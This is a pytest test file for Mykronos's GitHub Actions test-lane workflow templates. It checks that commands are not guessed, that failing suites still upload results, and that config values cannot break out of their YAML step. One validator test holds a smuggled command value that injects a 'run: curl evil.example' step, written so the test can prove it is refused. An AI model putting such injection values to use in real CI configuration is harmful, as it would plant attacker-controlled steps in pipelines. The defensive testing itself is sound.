"""The three test lanes, installable on GitHub Actions (spec 31 §5, D-046).

Nine capabilities run a scanner this platform chose. A test lane runs the
repository's own suite, and until now that meant Concourse only: the pipeline
named the command, no workflow template existed, and the Harness tab was dark
for every Actions-scanned repository. Spec 18 §0a named it honestly and left
it.

The tests that carry the weight here are the ones about what a test lane must
*not* do: it must not guess a command, it must not report a finding, and a
failing suite must not go unrecorded.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
import yaml

from mykronos.capabilities import CapabilityConfigError, validate_config
from mykronos.installer.templates import TemplateLibrary

TEMPLATES = Path(__file__).resolve().parents[2] / "workflow-templates"
LANES = ("unit", "functional", "qa")

RENDER: dict[str, Any] = {
    "repo_full_name": "acme/app",
    "default_branch": "main",
    "ingestion_api_url": "https://mykronos.internal/api",
    "token_secret_name": "MYKRONOS_INGESTION_TOKEN",
    "upload_action_ref": "ToddGBenson/mykronos/.github/actions/upload@v1",
    "mykronos_package_spec": "mykronos @ git+https://example.invalid@v5",
    "gate_depends_on": [],
}


@pytest.fixture
def library() -> TemplateLibrary:
    return TemplateLibrary(TEMPLATES)


def workflow(library: TemplateLibrary, capability: str, **config: Any) -> dict[str, Any]:
    config.setdefault("command", "make test")
    rendered = library.render(capability, config=config, **RENDER)
    document: dict[str, Any] = yaml.safe_load(rendered.content)
    return document


def steps(document: dict[str, Any], capability: str) -> list[dict[str, Any]]:
    listed: list[dict[str, Any]] = document["jobs"][capability]["steps"]
    return listed


def suite_step(document: dict[str, Any], capability: str) -> dict[str, Any]:
    return [s for s in steps(document, capability) if s.get("id") == "suite"][0]


class TestTheyExistAtAll:
    @pytest.mark.parametrize("capability", LANES)
    def test_the_manifest_carries_a_template(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """The gap spec 18 §0a named: an Actions-scanned repository could not
        enable these, because the install PR is generated *from* the templates
        of the capabilities being enabled."""
        assert capability in library.available

    @pytest.mark.parametrize("capability", LANES)
    def test_the_rendered_file_is_valid_yaml(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        document = workflow(library, capability)
        assert document["jobs"][capability]["runs-on"] == "ubuntu-latest"

    @pytest.mark.parametrize("capability", LANES)
    def test_each_lane_gets_its_own_file(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """Three lanes sharing a path would mean enabling the second silently
        replaced the first."""
        assert library.target_path(capability) == (
            f".github/workflows/mykronos-{capability}.yml"
        )


class TestTheCommandIsNotGuessed:
    @pytest.mark.parametrize("capability", LANES)
    def test_the_config_default_is_empty_not_a_runner(self, capability: str) -> None:
        """`pytest` because a `.py` file exists is how a platform ships a
        workflow that fails on every run for reasons the team did not
        choose."""
        assert validate_config(capability, {})["command"] == ""

    @pytest.mark.parametrize("capability", LANES)
    def test_the_command_reaches_the_workflow(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        document = workflow(
            library, capability, command="npx jest --reporters=jest-junit"
        )
        assert "npx jest --reporters=jest-junit" in suite_step(document, capability)["run"]

    @pytest.mark.parametrize("capability", LANES)
    def test_setup_lines_run_before_it(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        document = workflow(
            library,
            capability,
            command="pytest -q",
            setup=["pip install -e .", "./bin/seed"],
        )
        run = suite_step(document, capability)["run"]

        assert run.index("pip install -e .") < run.index("./bin/seed") < run.index("pytest -q")

    @pytest.mark.parametrize("capability", LANES)
    def test_the_results_directory_is_named_not_hardcoded(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """So a config written once keeps working if the upload contract
        moves."""
        assert "MYKRONOS_RESULTS" in suite_step(workflow(library, capability), capability)["env"]


class TestItCannotEscapeItsOwnStep:
    @pytest.mark.parametrize("capability", LANES)
    def test_a_newline_in_the_command_is_refused(self, capability: str) -> None:
        """A newline in a value rendered into YAML is a new line and possibly
        a new step. That is the boundary that matters — not the content of the
        command, which is a test suite and is arbitrary code by definition."""
        with pytest.raises(CapabilityConfigError, match="control character"):
            validate_config(
                capability, {"command": "pytest\n      - run: curl evil.example"}
            )

    @pytest.mark.parametrize("capability", LANES)
    def test_a_newline_in_a_setup_line_is_refused(self, capability: str) -> None:
        with pytest.raises(CapabilityConfigError, match="control character"):
            validate_config(
                capability, {"command": "pytest", "setup": ["a\n      - run: x"]}
            )

    def test_shell_metacharacters_are_allowed(self) -> None:
        """Refusing these would refuse most real test commands. The guard is
        about YAML structure, not about shell syntax."""
        config = validate_config("unit", {"command": "pytest -q | tee out.txt && ./check.sh"})

        assert "&&" in config["command"]


class TestWhatItReportsAndWhatItRefusesTo:
    @pytest.mark.parametrize("capability", LANES)
    def test_the_tool_is_junit_and_there_is_no_scanner(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """D-046: these produce no findings. A failing test is a defect and is
        not a vulnerability, and giving it a severity would put documentation
        drift into a security risk score."""
        rendered = library.render(capability, config={"command": "make test"}, **RENDER)

        assert "tool: junit" in rendered.content

    @pytest.mark.parametrize("capability", LANES)
    def test_a_failing_suite_still_uploads(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """`the tests failed` and `nothing told us anything` are different
        facts, and the second is worse (spec 04 §6)."""
        document = workflow(library, capability)
        upload = [
            s for s in steps(document, capability) if "upload" in str(s.get("uses", ""))
        ]

        assert suite_step(document, capability)["continue-on-error"] is True
        assert upload[0]["if"] == "always()"

    @pytest.mark.parametrize("capability", LANES)
    def test_the_build_fails_after_the_run_is_recorded(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """Failing earlier would make the pipeline's verdict and the
        platform's record disagree exactly when somebody needs them to
        agree."""
        names = [s["name"] for s in steps(workflow(library, capability), capability)]

        assert names.index("Upload results to Mykronos") < names.index(
            "Fail the build if the suite failed"
        )

    @pytest.mark.parametrize("capability", LANES)
    def test_turning_that_off_drops_the_step(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        names = [
            s["name"]
            for s in steps(
                workflow(library, capability, fail_build_on_failure=False), capability
            )
        ]

        assert "Fail the build if the suite failed" not in names
        assert "Upload results to Mykronos" in names

    @pytest.mark.parametrize("capability", LANES)
    def test_a_run_with_no_junit_xml_warns(
        self, library: TemplateLibrary, capability: str
    ) -> None:
        """Rather than being indistinguishable from a suite that passed."""
        summary = [
            s
            for s in steps(workflow(library, capability), capability)
            if s["name"] == "Say what the suite did"
        ][0]

        assert summary["if"] == "always()"
        assert "::warning::" in summary["run"]


class TestTheFunctionalLane:
    def test_the_target_environment_reaches_the_suite(
        self, library: TemplateLibrary
    ) -> None:
        document = workflow(library, "functional", target_environment="staging")

        assert suite_step(document, "functional")["env"][
            "MYKRONOS_TARGET_ENVIRONMENT"
        ] == "staging"

    def test_the_proxy_is_offered_not_asserted(self, library: TemplateLibrary) -> None:
        """Actions has no long-lived ZAP for a workflow to route through, so
        what this can honestly do is tell the suite where a proxy is when one
        is configured. Claiming a DAST corpus it never produced would be worse
        than producing none."""
        document = workflow(library, "functional", proxy_through_dast=True)

        assert "MYKRONOS_DAST_PROXY" in suite_step(document, "functional")["env"]

    def test_turning_the_proxy_off_removes_it_entirely(
        self, library: TemplateLibrary
    ) -> None:
        document = workflow(library, "functional", proxy_through_dast=False)

        assert "MYKRONOS_DAST_PROXY" not in suite_step(document, "functional")["env"]
